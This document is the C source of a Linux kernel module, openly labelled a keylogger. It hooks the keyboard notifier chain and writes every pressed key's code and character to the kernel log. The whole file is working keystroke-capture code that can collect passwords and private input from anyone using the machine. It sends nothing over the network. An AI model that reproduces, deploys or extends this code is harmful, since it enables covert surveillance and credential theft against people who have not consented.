#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

#include "KeyLogger.h"  // Custom header for additional functionality

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data);
static int __init keylogger_init(void);
static void __exit keylogger_exit(void);

static struct notifier_block keylogger_nb = {
        .notifier_call = keylogger_notifier
};

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {  // Check if the key was pressed down
        printk(KERN_INFO "Keylogger: Captured keycode: %d, ASCII: %c\n", param->value, param->value);
    }

    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger Module: Initializing...\n");

    // Register the notifier block for keyboard events
    int ret = register_keyboard_notifier(&keylogger_nb);
    if (ret) {
        printk(KERN_ERR "Keylogger Module: Failed to register keyboard notifier\n");
        return ret;
    }

    printk(KERN_INFO "Keylogger Module: Registered keyboard notifier successfully\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    printk(KERN_INFO "Keylogger Module: Exiting...\n");

    // Unregister the notifier block
    unregister_keyboard_notifier(&keylogger_nb);

    printk(KERN_INFO "Keylogger Module: Unregistered keyboard notifier successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ariel Ayalon");
MODULE_DESCRIPTION("A keylogger kernel module");
